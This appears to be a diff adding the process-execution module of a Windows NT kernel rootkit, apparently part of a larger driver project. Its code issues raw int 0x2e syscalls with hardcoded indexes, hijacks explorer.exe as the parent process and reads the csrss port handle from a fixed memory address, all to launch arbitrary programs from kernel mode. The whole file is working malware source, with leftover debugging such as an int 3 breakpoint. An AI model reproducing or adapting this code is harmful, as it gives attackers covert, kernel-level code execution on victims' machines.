@@ -1,0 +1,478 @@
+#include "ntddk.h"
+#include "ntdef.h"
+
+#include "rk_driver.h"
+#include "rk_process.h"
+#include "rk_exec.h"
+
+
+// This handle will be used as the source process for all operation from 
+// the exec().
+// Because the exec() is been called from worker thread, that run under
+// system process,we need under process (which be available ALL time) to use 
+// as source for creating the new process.
+//
+HANDLE	g_parent_process_handle=NULL;
+HANDLE	g_csrss_port_handle=NULL;
+
+
+ULONG ZWOPEN_FILE_INDEX=0x4f;
+ULONG ZWCREATE_SECTION_INDEX=0x21;
+ULONG ZWCREATE_PROCESS_INDEX=0x1f;
+ULONG ZWQUERY_SECTION_INDEX=0x77;
+ULONG ZWALLOCATE_VIRTUAL_MEMORY_INDEX=0xa;
+ULONG ZWPROTECT_VIRTUAL_MEMORY_INDEX=0x60;
+ULONG ZWCREATE_THREAD_INDEX=0x24;
+ULONG ZWQUERY_INFORMATION_PROCESS_INDEX=0x6d;
+ULONG ZWRESUME_THREAD_INDEX=0x96;
+ULONG ZWWRITE_VIRTUAL_MEMORY_INDEX=0xcb;
+ULONG ZWREAD_VIRTUAL_MEMORY_INDEX=0x89;
+ULONG ZWREQUEST_WAIT_REPLY_PORT_INDEX=0x93;
+
+
+
+// UTILS
+
+NTSTATUS UtilsZwRoutine(ULONG  ZwIndex,...){
+
+	NTSTATUS	status;
+
+	_asm{
+		Mov	EAX,[ZwIndex]
+		Lea	EDX,[EBP+0xC]
+		Int 0x2e
+		Mov	[status],EAX
+	}
+
+	return status;
+}
+
+
+HANDLE	GetLongLastingProcessHandle(){
+
+	unsigned	long n = 0x100;
+	PVOID		pProcess;
+	HANDLE		hLongLastingProcess=NULL;
+	struct _SYSTEM_PROCESSES *p = (struct _SYSTEM_PROCESSES *)ExAllocatePool(NonPagedPool, n);
+
+	
+	if(p)
+	{
+		struct _SYSTEM_PROCESSES *curr = NULL;
+		
+		// ------------------------------------------------------------------
+		// spin until our buffer is large enough to hold the results.
+		// Information Class 5 is 'ProcessAndThreadsInformation'
+		// ------------------------------------------------------------------
+		while(ZwQuerySystemInformation( 5, p, n, 0) 
+			== STATUS_INFO_LENGTH_MISMATCH)
+		{
+			ExFreePool(p);
+			n *= 2;
+			p = (struct _SYSTEM_PROCESSES *)ExAllocatePool(NonPagedPool, n);
+			
+			if(NULL == p)
+			{
+				break;
+			}
+		}
+		
+		if(p)
+		{
+			curr = p;
+		
+			// -------------------------------------------------------------------------
+			// forward through all entries in an array of process structures
+			// some processes will not have names. (System Idle, for example)
+			// -------------------------------------------------------------------------
+			while(curr)
+			{
+				ANSI_STRING process_name;
+
+				RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
+				if(process_name.Length>0)
+					if(_stricmp(process_name.Buffer,"explorer.exe")==0){
+						RtlFreeAnsiString(&process_name);
+
+						PsLookupProcessByProcessId(curr->ProcessId,&pProcess);
+						ObOpenObjectByPointer(pProcess,0,NULL,0,NULL,KernelMode,&hLongLastingProcess);
+
+						ExFreePool(p);
+				
+						return hLongLastingProcess;
+					}
+
+				RtlFreeAnsiString(&process_name);
+
+				if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
+				else curr = NULL;
+			}
+
+			ExFreePool(p);
+		}
+	}
+}
+
+VOID	DuplicateLongLastingPortHandle(){
+	PVOID			pPortHandle;
+
+	// Get the index of the port handle, used to send messages to csrss.
+	// FIX ME! find daynamic way to get this address.
+//	pPortHandle=(PVOID)0x77fa5b58; // NT Service Pack 4.
+	pPortHandle=(PVOID)0x77fa8168; // NT Service Pack 6.
+	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,g_parent_process_handle,pPortHandle,&g_csrss_port_handle,sizeof(g_csrss_port_handle),0);
+
+	// Duplicate the handle of the port to csrss to the ObjectTable of the System process
+	ZwDuplicateObject(	g_parent_process_handle,
+						g_csrss_port_handle,
+						0xFFFFFFFF,
+						&g_csrss_port_handle,
+						0,
+						0,
+						3);
+	
+
+}
+
+
+/// Exec related code...
+
+// Clone of Ntdll::RtlCreateProcessParameters...
+VOID RtlCreateProcessParameters(PPROCESS_PARAMETERS* pp,
+								PUNICODE_STRING	ImageFile,
+								PUNICODE_STRING	DllPath,
+								PUNICODE_STRING	CurrentDirectory,
+								PUNICODE_STRING	CommandLine,
+								ULONG	CreationFlag,
+								PUNICODE_STRING	WindowTitle,
+								PUNICODE_STRING	Desktop,
+								PUNICODE_STRING	Reserved,
+								PUNICODE_STRING	Reserved2){
+
+	PROCESS_PARAMETERS*	lpp;
+
+	ULONG	Size=sizeof(PROCESS_PARAMETERS);
+	if(ImageFile) Size+=ImageFile->MaximumLength;
+	if(DllPath) Size+=DllPath->MaximumLength;
+	if(CurrentDirectory) Size+=CurrentDirectory->MaximumLength;
+	if(CommandLine) Size+=CommandLine->MaximumLength;
+	if(WindowTitle) Size+=WindowTitle->MaximumLength;
+	if(Desktop) Size+=Desktop->MaximumLength;
+	if(Reserved) Size+=Reserved->MaximumLength;
+	if(Reserved2) Size+=Reserved2->MaximumLength;
+
+	//Allocate the buffer..
+	*pp=ExAllocatePool(NonPagedPool,Size);
+	lpp=*pp;
+	RtlZeroMemory(lpp,Size);
+
+	lpp->AllocationSize=PAGE_SIZE;
+	lpp->Size=sizeof(PROCESS_PARAMETERS); // Unicode size will be added (if any)
+	lpp->Flags=0;
+	lpp->Reserved=0;
+	lpp->Console=0;
+	lpp->ProcessGroup=0;
+	lpp->hStdInput=0;
+	lpp->hStdOutput=0;
+	lpp->hStdError=0;
+	if(CurrentDirectory){
+		lpp->CurrentDirectoryName.Length=CurrentDirectory->Length;
+		lpp->CurrentDirectoryName.MaximumLength=CurrentDirectory->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,CurrentDirectory->Buffer,CurrentDirectory->Length);
+		lpp->CurrentDirectoryName.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=CurrentDirectory->MaximumLength;
+	}
+	lpp->CurrentDirectoryHandle=0;
+	if(DllPath){
+		lpp->DllPath.Length=DllPath->Length;
+		lpp->DllPath.MaximumLength=DllPath->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,DllPath->Buffer,DllPath->Length);
+		lpp->DllPath.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=DllPath->MaximumLength;
+	}
+	if(ImageFile){
+		lpp->ImageFile.Length=ImageFile->Length;
+		lpp->ImageFile.MaximumLength=ImageFile->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,ImageFile->Buffer,ImageFile->Length);
+		lpp->ImageFile.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=ImageFile->MaximumLength;
+	}
+	if(CommandLine){
+		lpp->CommandLine.Length=CommandLine->Length;
+		lpp->CommandLine.MaximumLength=CommandLine->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,CommandLine->Buffer,CommandLine->Length);
+		lpp->CommandLine.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=CommandLine->MaximumLength;
+	}
+	lpp->Environment=0;
+	lpp->dwX=0;
+	lpp->dwY=0;
+	lpp->dwXSize=0;
+	lpp->dwYSize=0;
+	lpp->dwXCountChars=0;
+	lpp->dwYCountChars=0;
+	lpp->dwFillAttribute=0;
+	lpp->dwFlags=0;
+	lpp->wShowWindow=0;
+	if(WindowTitle){
+		lpp->WindowTitle.Length=WindowTitle->Length;
+		lpp->WindowTitle.MaximumLength=WindowTitle->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,WindowTitle->Buffer,WindowTitle->Length);
+		lpp->WindowTitle.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=WindowTitle->MaximumLength;
+	}
+	if(Desktop){
+		lpp->Desktop.Length=Desktop->Length;
+		lpp->Desktop.MaximumLength=Desktop->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Desktop->Buffer,Desktop->Length);
+		lpp->Desktop.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=Desktop->MaximumLength;
+	}
+	if(Reserved){
+		lpp->Reserved2.Length=Reserved->Length;
+		lpp->Reserved2.MaximumLength=Reserved->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Reserved->Buffer,Reserved->Length);
+		lpp->Reserved2.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=Reserved->MaximumLength;
+	}
+	if(Reserved2){
+		lpp->Reserved3.Length=Reserved2->Length;
+		lpp->Reserved3.MaximumLength=Reserved2->MaximumLength;
+		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Reserved2->Buffer,Reserved2->Length);
+		lpp->Reserved3.Buffer=(PWCHAR)lpp->Size;
+		lpp->Size+=Reserved2->MaximumLength;
+	}
+}
+
+// Clone of user mode API, again....
+// (May be changed if PEB or PROCESS_PARAMETER struct change !!!)
+PWSTR	GetEnvironmentStrings(){
+	PROCESS_BASIC_INFORMATION	pbi;
+	PVOID						p;
+	PWSTR						env;
+
+	//FIX ME!! No power for making code to check env block length :)) 
+	ULONG						envSize=PAGE_SIZE;
+
+
+	UtilsZwRoutine(ZWQUERY_INFORMATION_PROCESS_INDEX,g_parent_process_handle,ProcessBasicInformation,
+					&pbi,sizeof(pbi),0);  
+
+	// Get pointer to current process, "process parameters"
+	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,g_parent_process_handle,(PCHAR)pbi.PebBaseAddress+0x10,&p,sizeof(p),0);
+
+	// Get pointer Environment block...
+	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,g_parent_process_handle,(PCHAR)p+0x48,&p,sizeof(p),0);
+
+	env=ExAllocatePool(NonPagedPool,envSize);
+
+	// Get pointer Environment block...
+	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,g_parent_process_handle,p,env,envSize,0);
+
+	return env;
+}
+
+
+PWSTR	CopyEnvironment(HANDLE	hProcess){
+
+	PWSTR	env;
+	ULONG	n;
+	ULONG	m;
+	PVOID	p=0;
+
+	env=GetEnvironmentStrings();
+
+	for(n=0;env[n]!=0;n+=wcslen(env+n)+1);
+	n*=sizeof(*env);
+
+	m=n;
+
+	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&p,0,&m,
+					MEM_COMMIT,PAGE_READWRITE);
+
+	UtilsZwRoutine(ZWWRITE_VIRTUAL_MEMORY_INDEX,hProcess,p,env,n,0);
+
+	return (PWSTR)p;
+}
+
+VOID CreateProcessParameters(HANDLE hProcess,PPEB Peb,PUNICODE_STRING ImageName){
+		
+	PPROCESS_PARAMETERS	pp;
+	ULONG				n;
+	PVOID				p=0;
+	
+	UNICODE_STRING		CurrentDirectory;				
+	UNICODE_STRING		DllPath;				
+
+	
+	RtlInitUnicodeString(&CurrentDirectory,L"C:\\WINNT\\SYSTEM32\\");
+	RtlInitUnicodeString(&DllPath,L"C:\\;C:\\WINNT\\;C:\\WINNT\\SYSTEM32\\");
+
+	RtlCreateProcessParameters(&pp,ImageName,&DllPath,&CurrentDirectory,ImageName,0,0,0,0,0);
+
+	pp->Environment=CopyEnvironment(hProcess);
+	
+	n=pp->Size;
+
+	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&p,0,&n,
+					MEM_COMMIT,PAGE_READWRITE);
+
+	UtilsZwRoutine(ZWWRITE_VIRTUAL_MEMORY_INDEX,hProcess,p,pp,pp->Size,0);
+
+	UtilsZwRoutine(ZWWRITE_VIRTUAL_MEMORY_INDEX,hProcess,(PCHAR)Peb+0x10,&p,sizeof(p),0);
+
+	// No way i will write a clone to destroy those !@#$@! parameters :))
+	// Actually its only a Free()..
+}
+
+typedef struct _CSRMSG{
+	PORT_MESSAGE	PortMessage;
+	CSRSS_MESSAGE	CsrssMessage;
+	PROCESS_INFORMATION	ProcessInformation;
+	CLIENT_ID		Debuger;
+	ULONG			CreationFlags;
+	ULONG			VdmInfo[2];
+}CSRMSG,*PCSRMSG;
+
+// This code will be very ugly, and im not realy give a damn
+VOID InformCsrss(HANDLE hProcess,HANDLE hThread,ULONG pid,ULONG tid){
+	CSRMSG			csrmsg;
+	PVOID			p;
+	PVOID			pPortHandle;
+
+	RtlZeroMemory(&csrmsg,sizeof(CSRMSG));
+
+	csrmsg.ProcessInformation.hProcess=hProcess;
+	csrmsg.ProcessInformation.hThread=hThread;
+	csrmsg.ProcessInformation.dwProcessId=pid;
+	csrmsg.ProcessInformation.dwThreadId=tid;
+
+	csrmsg.PortMessage.MessageSize=0x4c;
+	csrmsg.PortMessage.DataSize=0x34;
+	
+	csrmsg.CsrssMessage.Opcode=0x10000;
+
+	UtilsZwRoutine(ZWREQUEST_WAIT_REPLY_PORT_INDEX,g_csrss_port_handle,&csrmsg,&csrmsg);
+}
+
+
+int exec(PUNICODE_STRING ImageName){
+
+	HANDLE	hProcess;
+	HANDLE	hThread;
+	HANDLE	hSection;
+	HANDLE	hFile;
+
+    OBJECT_ATTRIBUTES	oa;
+	IO_STATUS_BLOCK		ioStatus;
+
+	SECTION_IMAGE_INFORMATION	sii;
+	USER_STACK			stack={0};
+	ULONG				n,x;
+	PVOID				p;
+
+	CONTEXT				context={CONTEXT_FULL};
+	CLIENT_ID			cid;
+
+	PROCESS_BASIC_INFORMATION	pbi;
+
+
+	LARGE_INTEGER timeout;
+	NTSTATUS waitstatus;
+	KIRQL aIrqL;
+
+
+	if(g_parent_process_handle==NULL)
+		g_parent_process_handle=GetLongLastingProcessHandle();
+
+	if(g_parent_process_handle!=NULL)
+		DuplicateLongLastingPortHandle();
+	else
+		return;
+
+
+	InitializeObjectAttributes(&oa, ImageName, OBJ_CASE_INSENSITIVE, 0, 0);
+
+
+	UtilsZwRoutine(	ZWOPEN_FILE_INDEX,&hFile,FILE_EXECUTE | SYNCHRONIZE,
+					&oa,&ioStatus,FILE_SHARE_READ,FILE_SYNCHRONOUS_IO_NONALERT);
+
+	oa.ObjectName=0;
+
+	UtilsZwRoutine( ZWCREATE_SECTION_INDEX,&hSection,SECTION_ALL_ACCESS,&oa,0,
+					PAGE_EXECUTE,SEC_IMAGE,hFile);
+
+	ZwClose(hFile);
+
+
+	UtilsZwRoutine(ZWCREATE_PROCESS_INDEX,&hProcess,PROCESS_ALL_ACCESS,&oa,0xffffffff,FALSE,
+					hSection,0,0);
+
+	UtilsZwRoutine(ZWQUERY_SECTION_INDEX,hSection,SectionImageInformation,
+					&sii,sizeof(sii),0);
+
+	ZwClose(hSection);
+
+	n=sii.StackReserve;
+	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&stack.ExpandableStackBottom,0,&n,
+					MEM_RESERVE,PAGE_READWRITE);
+
+	stack.ExpandableStackBase=(PCHAR)(stack.ExpandableStackBottom)+sii.StackReserve;
+	stack.ExpandableStackLimit=(PCHAR)(stack.ExpandableStackBase)-sii.StackCommit;
+
+	n=sii.StackCommit+PAGE_SIZE;
+	p=(PCHAR)(stack.ExpandableStackBase)-n;
+
+	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&p,0,&n,
+					MEM_COMMIT,PAGE_READWRITE);
+
+	n=PAGE_SIZE;
+
+	UtilsZwRoutine(ZWPROTECT_VIRTUAL_MEMORY_INDEX,hProcess,&p,&n,
+					PAGE_READWRITE | PAGE_GUARD,&x);
+
+	
+	context.SegGs=0;
+	context.SegFs=0x38;
+	context.SegEs=0x20;
+	context.SegDs=0x20;
+	context.SegSs=0x20;
+	context.SegCs=0x18;
+	context.EFlags=0x3000;
+	context.Esp=(ULONG)(stack.ExpandableStackBase)-4;
+	context.Eip=(ULONG)(sii.EntryPoint);
+
+			
+	UtilsZwRoutine(ZWCREATE_THREAD_INDEX,&hThread,THREAD_ALL_ACCESS,&oa,
+					hProcess,&cid,&context,&stack,TRUE);
+
+
+	UtilsZwRoutine(ZWQUERY_INFORMATION_PROCESS_INDEX,hProcess,ProcessBasicInformation,
+					&pbi,sizeof(pbi),0);
+
+	CreateProcessParameters(hProcess,pbi.PebBaseAddress,ImageName);
+
+
+	_asm{ int 3}
+	InformCsrss(hProcess,hThread,(ULONG)(cid.UniqueProcess),(ULONG)(cid.UniqueThread));
+
+
+/*	timeout.QuadPart = -(15 * 1000 * 10000);
+
+	KeResetEvent(&command_signal_event);
+
+	waitstatus = KeWaitForSingleObject(	
+							&command_signal_event,
+							Executive,
+							KernelMode,
+							FALSE,
+							&timeout);*/
+
+
+	UtilsZwRoutine(ZWRESUME_THREAD_INDEX,hThread,0);
+
+	ZwClose(hProcess);
+	ZwClose(hThread);
+
+	return (int)(cid.UniqueProcess);
+}
